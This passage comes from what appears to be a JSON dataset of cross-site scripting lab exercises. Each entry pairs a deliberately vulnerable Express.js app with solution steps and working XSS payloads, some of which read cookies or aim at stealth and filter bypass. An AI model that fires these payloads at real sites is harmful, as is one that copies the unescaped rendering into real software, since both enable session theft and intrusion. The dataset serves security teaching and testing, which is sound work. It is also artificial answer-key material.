      "srcCode": "const express = require('express');\nconst app = express();\nlet tag = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/log-tag', (req, res) => { tag = req.body.tag; res.redirect('/logs'); });\napp.get('/logs', (req, res) => { res.send(`<html><body><code>${tag}</code></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via QR code label in asset management system",
      "Lab Description": "Labels assigned to assets are shown with the QR code using innerHTML. A malicious label can cause XSS on asset inspection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Assign label: <img src=x onerror=alert('XSS')>",
        "Scan or load QR preview",
        "Observe script execution near QR render"
      ],
      "payloads": [
        "<script>alert('qrLabelXSS')</script>",
        "<img src=x onerror=alert('qr')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-asset', (req, res) => { label = req.body.label; res.redirect('/asset'); });\napp.get('/asset', (req, res) => { res.send(`<html><body><p>${label}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via live stream chat poll option text",
      "Lab Description": "Live polls in stream chats allow user-submitted options. These are inserted via innerHTML. A crafted poll option causes stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add option: <img src=x onerror=alert('XSS')>",
        "Start the poll and wait for results",
        "Observe script execution in poll UI"
      ],
      "payloads": [
        "<script>alert('pollOptionXSS')</script>",
        "<img src=x onerror=alert('vote')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet option = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-option', (req, res) => { option = req.body.option; res.redirect('/poll'); });\napp.get('/poll', (req, res) => { res.send(`<html><body><li>${option}</li></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via release note entry in CI/CD tool",
      "Lab Description": "DevOps users can write release notes. These are rendered in dashboards using innerHTML. Unsanitized notes trigger persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Write note: <img src=x onerror=alert('XSS')>",
        "Open release logs",
        "Payload executes inside the release preview"
      ],
      "payloads": [
        "<script>alert('releaseXSS')</script>",
        "<img src=x onerror=alert('ci')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/release', (req, res) => { note = req.body.note; res.redirect('/releases'); });\napp.get('/releases', (req, res) => { res.send(`<html><body><article>${note}</article></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via game character nickname field",
      "Lab Description": "Players can assign nicknames to characters. These names are shown in the scoreboard using innerHTML. A malicious nickname causes XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Set nickname: <script>alert('XSS')</script>",
        "Join a public match and view scoreboard",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('nicknameXSS')</script>",
        "<img src=x onerror=alert('game')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet nickname = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/nickname', (req, res) => { nickname = req.body.name; res.redirect('/scoreboard'); });\napp.get('/scoreboard', (req, res) => { res.send(`<html><body><td>${nickname}</td></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via virtual tour stop title",
      "Lab Description": "Admins can name virtual stops in a tour. Titles are rendered via innerHTML. Unsanitized input causes stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create stop titled: <script>alert('XSS')</script>",
        "View tour interface",
        "Observe script execution in stop title"
      ],
      "payloads": [
        "<script>alert('tourXSS')</script>",
        "<img src=x onerror=alert('stop')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet stop = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-stop', (req, res) => { stop = req.body.title; res.redirect('/tour'); });\napp.get('/tour', (req, res) => { res.send(`<html><body><h2>${stop}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via AI prompt history entry",
      "Lab Description": "Prompt history is saved and rendered using innerHTML. A crafted prompt string can result in stored XSS when revisiting history.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Enter prompt: <img src=x onerror=alert('XSS')>",
        "Navigate to prompt history",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('aiPromptXSS')</script>",
        "<img src=x onerror=alert('prompt')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet prompt = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/save-prompt', (req, res) => { prompt = req.body.text; res.redirect('/history'); });\napp.get('/history', (req, res) => { res.send(`<html><body><div>${prompt}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via external service alias in integrations dashboard",
      "Lab Description": "Users can create aliases for external services. These aliases are rendered via innerHTML in the integrations panel. A malicious alias causes stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create alias: <script>alert('XSS')</script>",
        "Open integrations dashboard",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('integrationXSS')</script>",
        "<img src=x onerror=alert('alias')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet alias = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-alias', (req, res) => { alias = req.body.alias; res.redirect('/integrations'); });\napp.get('/integrations', (req, res) => { res.send(`<html><body><span>${alias}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via user-created playlist folder name",
      "Lab Description": "Users can group playlists into folders. Folder names are rendered via innerHTML. A crafted folder name causes XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Name folder: <img src=x onerror=alert('XSS')>",
        "Open playlist manager",
        "Observe script execution in folder display"
      ],
      "payloads": [
        "<script>alert('playlistXSS')</script>",
        "<img src=x onerror=alert('folder')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet folder = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-folder', (req, res) => { folder = req.body.name; res.redirect('/playlists'); });\napp.get('/playlists', (req, res) => { res.send(`<html><body><div>${folder}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via custom calendar event title",
      "Lab Description": "Users can create calendar events with titles. These titles are rendered using innerHTML in event popups. A crafted title causes stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create event titled: <img src=x onerror=alert('XSS')>",
        "Open calendar and click the event",
        "Observe script execution in popup"
      ],
      "payloads": [
        "<script>alert('calendarXSS')</script>",
        "<img src=x onerror=alert('event')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet eventTitle = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-event', (req, res) => { eventTitle = req.body.title; res.redirect('/calendar'); });\napp.get('/calendar', (req, res) => { res.send(`<html><body><div>${eventTitle}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via invoice recipient name in billing dashboard",
      "Lab Description": "Invoices include recipient names displayed using innerHTML. A crafted name can trigger XSS when viewing invoice history.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send invoice to: <script>alert('XSS')</script>",
        "Open billing history",
        "Script executes from recipient name"
      ],
      "payloads": [
        "<script>alert('invoiceXSS')</script>",
        "<img src=x onerror=alert('recipient')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet recipient = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/send-invoice', (req, res) => { recipient = req.body.name; res.redirect('/invoices'); });\napp.get('/invoices', (req, res) => { res.send(`<html><body><h3>${recipient}</h3></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via push notification preview content",
      "Lab Description": "Push notifications can be previewed before sending. The content is rendered using innerHTML. Malicious content triggers reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Go to /preview?content=<script>alert(1)</script>",
        "Observe reflected payload in notification preview",
        "Payload executes on page load"
      ],
      "payloads": [
        "<script>alert('pushXSS')</script>",
        "<img src=x onerror=alert('preview')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/preview', (req, res) => {\n  const content = req.query.content || 'Hello!';\n  res.send(`<html><body><div>${content}</div></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via voice assistant custom command name",
      "Lab Description": "Users can define voice commands. These names are rendered using innerHTML in the web dashboard. A crafted command causes persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create command: <script>alert('XSS')</script>",
        "Visit assistant dashboard",
        "Script executes from command display"
      ],
      "payloads": [
        "<script>alert('voiceXSS')</script>",
        "<img src=x onerror=alert('voice')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet command = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-command', (req, res) => { command = req.body.command; res.redirect('/assistant'); });\napp.get('/assistant', (req, res) => { res.send(`<html><body><button>${command}</button></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via survey question field in feedback system",
      "Lab Description": "Admins can add survey questions. Questions are rendered via innerHTML in response forms. A crafted question leads to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create question: <img src=x onerror=alert(1)>",
        "View the survey as a user",
        "Script executes in the question header"
      ],
      "payloads": [
        "<script>alert('surveyXSS')</script>",
        "<img src=x onerror=alert('question')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet question = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-question', (req, res) => { question = req.body.text; res.redirect('/survey'); });\napp.get('/survey', (req, res) => { res.send(`<html><body><label>${question}</label></body></html>`); });\napp.listen(3000);"
    },
    {
    "Lab scenario": "Stored XSS in Feedback Widget",
    "Lab Description": "The feedback widget stores user-submitted feedback and displays it for admin review. The text is injected into the DOM using innerHTML without escaping, allowing stored XSS.\nTo solve: Submit a feedback entry with script code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback with a script tag via /feedback.",
      "View feedback via /admin to observe XSS.",
      "Try encoded payloads or HTML event attributes.",
      "Confirm the XSS is persistent across sessions.",
      "Observe execution without admin interaction."
    ],
    "payloads": [
      "<script>alert('Feedback XSS')</script>",
      "<img src=1 onerror=alert('Stored')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/feedback', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Feedback Form</h2>\n        <form action='/submit' method='POST'>\n          <textarea name='msg' placeholder='Your feedback'></textarea>\n          <button>Send</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/submit', (req, res) => {\n  feedbacks.push(req.body.msg);\n  console.log('[SUBMIT] New feedback:', req.body.msg);\n  res.redirect('/admin');\n});\n\napp.get('/admin', (req, res) => {\n  const out = feedbacks.map(m => `<div>${m}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Admin Panel</h2>\n        ${out}\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Feedback system ready'));\n"
  },
  {
    "Lab scenario": "Reflected XSS in Newsletter Signup Confirmation",
    "Lab Description": "After a newsletter signup, the server reflects the name parameter in a confirmation message. This allows reflected XSS via the URL.\nTo solve: Inject script in the name parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to /signup?name=YourName.",
      "Replace the name with a payload: <script>alert('XSS')</script>.",
      "Check the confirmation message for script execution.",
      "Test different HTML elements to bypass filters.",
      "Confirm execution before any form interaction."
    ],
    "payloads": [
      "<script>alert('Newsletter')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/signup', (req, res) => {\n  const name = req.query.name || 'User';\n  console.log('[INFO] Signup from:', name);\n  res.send(`\n    <html>\n      <body>\n        <h2>Thank You</h2>\n        <p>Welcome, ${name}! You've been subscribed.</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Newsletter server running'));\n"
  },
  {
    "Lab scenario": "DOM-based XSS in Chat Preview",
    "Lab Description": "A chat preview interface uses localStorage to show the last message in the DOM via innerHTML. A crafted value can execute code when the preview is loaded.\nTo solve: Inject XSS via localStorage and refresh the preview page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open browser console and run: localStorage.setItem('lastMsg', '<img src=x onerror=alert(1)>').",
      "Navigate to /chat to preview the message.",
      "Observe the script executing from localStorage.",
      "Try encoded or nested payloads.",
      "Clear localStorage to reset the preview."
    ],
    "payloads": [
      "<script>alert('DOM Chat')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/chat', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Chat Preview</h2>\n        <div id='msg'></div>\n        <script>\n          const preview = localStorage.getItem('lastMsg');\n          if (preview) {\n            document.getElementById('msg').innerHTML = preview;\n            console.log('[DEBUG] Rendered preview:', preview);\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Chat preview on 3000'));\n"
  },
  {
    "Lab scenario": "Stored XSS in Blog Post Comments",
    "Lab Description": "A blog page lets users comment on posts. Comments are stored in memory and rendered directly on the blog without sanitization, allowing stored XSS.\nTo solve: Submit a comment containing a script and refresh the blog to see it execute.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /blog and locate the comment form.",
      "Submit a comment with a script tag payload.",
      "Reload the page and observe persistent script execution.",
      "Try variations for different alert messages.",
      "Confirm the payload runs after page refresh."
    ],
    "payloads": [
      "<script>alert('Blog XSS')</script>",
      "<img src=1 onerror=alert('Stored')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/blog', (req, res) => {\n  const renderedComments = comments.map(c => `<p>${c}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Blog Post</h2>\n        <p>Interesting article about security!</p>\n        <h3>Comments</h3>\n        ${renderedComments}\n        <form action='/comment' method='POST'>\n          <input name='text' placeholder='Comment here'>\n          <button>Post</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/comment', (req, res) => {\n  console.log('[LOG] New comment:', req.body.text);\n  comments.push(req.body.text);\n  res.redirect('/blog');\n});\n\napp.listen(3000, () => console.log('Blog server running'));\n"
  },
  {
    "Lab scenario": "Reflected XSS in Support Ticket Viewer",
    "Lab Description": "The support dashboard displays ticket previews by taking `title` and `desc` as query parameters. These are inserted into the DOM without escaping, allowing reflected XSS via the `desc` field.\nTo solve: Inject a script in the desc parameter to trigger an alert on preview.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit /ticket?title=Help&desc=Issue+Details.",
      "Replace desc with a script payload like <script>alert('XSS')</script>.",
      "Load the page and observe reflected script execution.",
      "Try encoding the payload if filters exist.",
      "Confirm that every load with the payload triggers alert."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('Reflected')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/ticket', (req, res) => {\n  const { title = 'No Title', desc = 'No Description' } = req.query;\n  console.log('[DEBUG] Ticket received:', { title, desc });\n  res.send(`\n    <html>\n      <body>\n        <h2>Support Ticket</h2>\n        <h3>${title}</h3>\n        <p>${desc}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Ticket Viewer running on 3000'));\n"
  },
  {
    "Lab scenario": "DOM-based XSS via Drag-and-Drop Upload Preview",
    "Lab Description": "The dashboard includes a drag-and-drop file upload zone with preview text. The application sets the preview using `innerHTML` from the dragged file name without sanitization.\nTo solve: Simulate a drag-drop event with a crafted filename triggering script execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open DevTools and simulate a drag-and-drop event with a fake File object.",
      "Set file name to: <img src=x onerror=alert('XSS')>.",
      "Drop it in the upload zone and observe script execution.",
      "Try encoded variants and payloads with data URIs.",
      "Confirm reliable trigger without actual file upload."
    ],
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>",
      "javascript:alert(document.domain)"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use(express.static('.'));\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='drop-zone'>Drop file here</div>\n        <div id='preview'></div>\n        <script>\n          const dropZone = document.getElementById('drop-zone');\n          dropZone.addEventListener('drop', (e) => {\n            e.preventDefault();\n            const file = e.dataTransfer.files[0];\n            document.getElementById('preview').innerHTML = file.name;\n          });\n          dropZone.addEventListener('dragover', e => e.preventDefault());\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "Stored XSS in ChatBot Interaction History",
    "Lab Description": "A web-based chatbot logs previous interactions and loads them from local storage using `innerHTML`. Messages are not encoded before rendering, allowing injection.\nTo solve: Inject a payload into localStorage and reload to trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open console and set localStorage.setItem('chatLog', '<img src=x onerror=alert(1)>').",
      "Refresh the page and check the chat area.",
      "Confirm the script executes.",
      "Try payloads with event handlers or <details>/<summary> tags.",
      "Test visibility and stealth of payloads in different themes."
    ],
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<details open ontoggle=alert(1)>X</details>",
      "<svg onload=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='chat'></div>\n        <script>\n          const log = localStorage.getItem('chatLog');\n          if (log) document.getElementById('chat').innerHTML = log;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "Reflected XSS via Username in WebSocket Debug Echo",
    "Lab Description": "A debug tool sends WebSocket messages with a username in the query string. The page reflects the username using `document.write`, exposing it to XSS.\nTo solve: Craft a URL with a payload in the `user` parameter that executes in real-time.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access /ws-debug?user=<svg/onload=alert(1)>.",
      "Observe payload reflected and executed.",
      "Test vectors with WebSocket events and reconnect attempts.",
      "Use minimal tags to bypass CSP or validation.",
      "Confirm script executes before WebSocket connection opens."
    ],
    "payloads": [
      "<svg/onload=alert('XSS')>",
      "<img src=x onerror=alert('WS XSS')>",
      "<script>alert('Injected')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/ws-debug', (req, res) => {\n  const user = req.query.user || 'guest';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          document.write('<div>Welcome ${user}</div>');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "Stored XSS in Theme Name for Admin Preview",
    "Lab Description": "Admin panel allows creating custom UI themes. The theme name is stored and reflected without escaping in a preview panel using `innerHTML`.\nTo solve: Inject a payload as a theme name, save it, and preview to trigger XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login as admin and create a theme with name: <img src=x onerror=alert('XSS')>.",
      "Save the theme and go to preview section.",
      "Confirm payload executes in theme header.",
      "Try encoded scripts or nested tag vectors.",
      "Validate persistence across user sessions."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('Theme XSS')>",
      "<script>alert('Theme Injected')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet themeName = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-theme', (req, res) => {\n  themeName = req.body.name;\n  res.redirect('/preview-theme');\n});\n\napp.get('/preview-theme', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h1>Preview: ${themeName}</h1>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "DOM-based XSS in URL Fragment-based Loader",
    "Lab Description": "A documentation site loads pages based on the URL fragment and injects it into the DOM using `innerHTML`. No validation is done on the hash, enabling XSS.\nTo solve: Craft a URL with a malicious hash and observe DOM execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Access /#<img src=x onerror=alert('XSS')>.",
      "Watch how the fragment is injected into the page.",
      "Confirm DOM-based XSS on reload.",
      "Use nested <template> or <marquee> for stealth.",
      "Test on different browsers for reliability."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('Hash XSS')>",
      "<marquee onstart=alert('XSS')>hi</marquee>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='doc'></div>\n        <script>\n          const hash = location.hash.slice(1);\n          document.getElementById('doc').innerHTML = hash;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  
  {
    "Lab scenario": "Reflected XSS via Search Suggestion Parameter",
    "Lab Description": "The search page accepts a `suggest` parameter that is reflected directly into a live suggestion box using `innerHTML`. There is no sanitization, and script injection is possible.\nTo solve: Inject a payload via the suggest parameter and trigger execution in the suggestion box.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to /search?suggest=<img src=x onerror=alert(1)>",
      "Observe the suggestion box rendering the payload",
      "Try inline scripts or attribute-based vectors",
      "Confirm execution on every keypress if the parameter updates dynamically"
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(document.domain)>",
      "<script>alert('Reflected')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const suggest = req.query.suggest || '';\n  res.send(`\n    <html>\n      <body>\n        <div>Suggestions:</div>\n        <div id='suggestion-box'></div>\n        <script>\n          document.getElementById('suggestion-box').innerHTML = '${suggest}';\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "Stored XSS in Comment System Avatar Field",
    "Lab Description": "Users can leave comments with a custom avatar URL. The server stores the avatar field and renders it in an <img> tag without validation.\nTo solve: Submit a comment with an avatar containing a malicious payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a comment with avatar: x onerror=alert(1)",
      "Reload the page to trigger the <img> tag error handler",
      "Try payloads with event handlers or SVG URIs",
      "Confirm persistence across multiple sessions"
    ],
    "payloads": [
      "x onerror=alert(1)",
      "x\" onerror=\"alert('stored')",
      "data:image/svg+xml,<svg onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push({ user: req.body.user, avatar: req.body.avatar });\n  res.redirect('/comments');\n});\n\napp.get('/comments', (req, res) => {\n  const list = comments.map(c => `<div><img src='${c.avatar}'><b>${c.user}</b></div>`).join('');\n  res.send(`<html><body>${list}</body></html>`);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "DOM XSS via Dynamic FAQ Loader",
    "Lab Description": "The FAQ page loads answers based on the question ID from the URL and inserts content using `innerHTML`. It trusts hash fragments and does not sanitize them.\nTo solve: Inject a payload into the fragment and observe script execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Go to /faq#<img src=x onerror=alert(1)>",
      "Observe the dynamic content area rendering your payload",
      "Test with scripts, SVG, or <video poster> vectors",
      "Confirm execution across different browsers"
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<video><source onerror=alert(1)>",
      "<svg onload=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/faq', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='faq-content'></div>\n        <script>\n          const hash = decodeURIComponent(location.hash.slice(1));\n          document.getElementById('faq-content').innerHTML = hash;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "Reflected XSS in Email Invitation Link",
    "Lab Description": "A collaboration tool sends invitation links with a `ref` parameter that gets rendered on the join page using `document.write`. There’s no escaping.\nTo solve: Craft a malicious `ref` that executes JavaScript when opened.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a URL like /invite?ref=<script>alert('XSS')</script>",
      "Send to target or open directly",
      "Observe script execution before any validation happens",
      "Try encoding or malformed attribute injection"
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('ref')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/invite', (req, res) => {\n  const ref = req.query.ref || '';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          document.write('Invited by: ' + '${ref}');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "Stored XSS in Image Gallery Title Field",
    "Lab Description": "An image gallery allows uploading a picture with a title. The title is rendered with `innerHTML` and stored without sanitization, allowing persistent XSS.\nTo solve: Upload an image with a malicious title payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload an image with a title: <img src=x onerror=alert(1)>",
      "Visit the gallery and find the injected title",
      "Confirm that the script executes without interaction",
      "Try stealthy payloads using <math> or <object>"
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
      "<object data=x onerror=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet images = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload', (req, res) => {\n  images.push({ title: req.body.title });\n  res.redirect('/gallery');\n});\n\napp.get('/gallery', (req, res) => {\n  const html = images.map(i => `<div>${i.title}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);\n"
  },
  {
      "Lab scenario": "XSS via MathML inside SVG",
      "Lab Description": "The app allows users to upload and preview SVG content. When MathML is embedded within the SVG and improperly sanitized, script execution becomes possible.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Embed MathML with malicious payload inside SVG",
        "Submit to preview endpoint",
        "Script executes when SVG is rendered"
      ],
      "payloads": [
        "<svg><foreignObject><math><mtext><script>alert(1)</script></mtext></math></foreignObject></svg>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/upload-svg', (req, res) => {\n  const svg = req.body;\n  res.send(`<html><body>${svg}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via JSONP callback reflection",
      "Lab Description": "The app provides JSONP API for legacy support. The callback parameter is not sanitized, allowing injection of arbitrary scripts.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft a malicious callback parameter",
        "Server reflects it directly",
        "Script executes in client"
      ],
      "payloads": [
        "alert(1)//",
        "console.log(document.cookie)//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/jsonp', (req, res) => {\n  const callback = req.query.callback;\n  const data = JSON.stringify({ message: \"hello\" });\n  res.type('text/javascript');\n  res.send(`${callback}(${data})`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via base64 decoded input injection",
      "Lab Description": "User input is expected to be base64 encoded. App decodes it and renders it directly without sanitization.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit base64 encoded HTML containing script",
        "Server decodes and injects",
        "Script executes"
      ],
      "payloads": [
        "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/decode', (req, res) => {\n  const encoded = req.query.q || '';\n  const decoded = Buffer.from(encoded, 'base64').toString('utf-8');\n  res.send(`<html><body>${decoded}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via email template injection",
      "Lab Description": "The app generates email previews using user input for testing. Email body is inserted directly into the preview with no output encoding.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inject HTML inside email content field",
        "Email preview renders it",
        "Script executes"
      ],
